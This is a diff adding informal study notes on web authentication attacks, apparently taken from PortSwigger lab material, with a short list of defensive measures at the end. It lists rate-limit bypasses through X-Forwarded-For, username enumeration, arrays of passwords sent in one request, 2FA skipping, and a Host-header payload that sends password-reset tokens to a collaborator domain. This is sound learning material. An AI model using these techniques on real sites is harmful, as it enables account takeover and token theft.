@@ -1,0 +1,61 @@
+Authentication
+
+https://portswigger.net/web-security/authentication
+
+
+    Something you know, such as a password or the answer to a security question. These are sometimes referred to as "knowledge factors".
+    Something you have, that is, a physical object like a mobile phone or security token. These are sometimes referred to as "possession factors".
+    Something you are or do, for example, your biometrics or patterns of behavior. These are sometimes referred to as "inherence factors".
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Username/Password Bruteforce
+
+We should pay attention on these:
+Status codes
+Error messages
+Response times
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+X-Forwarded-For: 1   || Increment 1 for every request to bypass time based block
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+login with right user credentials once in 3 times    ||  To bypass blocked by ip (Rate-limit)
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Username enumeration via account lock
+
+Try intrudind password with NULL PAYLOAD and analyze the length and select the right username and britefroce with password
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Broken brute-force protection, multiple credentials per request
+
+If request is in json format then instead of single passowrd use list of password with help of [ password1, password2, password3 ]
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Basic 2FA Bypass
+
+If password and 2FA or in different pages, once you entered correct credentials try to change page from 2FA-token to my-account
+Check is there any posiblelity to change username in 2FA to enter 2FA page of other user without other user credendials
+If they had a security machanisiem has after 2 incorrect tocken need to login with user credendials again || Use session handleing in burp to bypass this
+And try to understand cookie formula
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Reset Password
+
+Try to change user identity in password reset (request)
+try to add X-Forwarded-Host: Burp-collabrator OR on HOST: Burp-collabrator header in request that sending password-reset link   || Used to steal secret-token
+Else
+   add this to end of the HOST:xxxxx:'<a href="//w1yn3hjas5zj8zv31nbcdsgf268xwm.burpcollaborator.net/?
+In change password with current password try to change username, current password, and mis-match new password
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+PREVENTING AUTHORIZATION:
+
+https://portswigger.net/web-security/authentication/securing
+
+Make sure data in transfer is encrypted HTTPS
+Use password checker before user set their passowrd like P@ssw0rd!
+Prevent username enumeration 
+  Avoid different error based on username validation
+  Avoid different time delays in authentications
+  Avoid different status code
+  Avoid username visible publicly
+Make stict IP-based rate limit and implement CAPCHA every 3 incorrect logins
+Double check your validation and verification logic, It should not lead any logic flows
+Apart from main login machanisiem, verify all other authentication machanisiem is stronger ex: password reset or password change
+Implement 2FA and double check for logic flows.
+----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+  
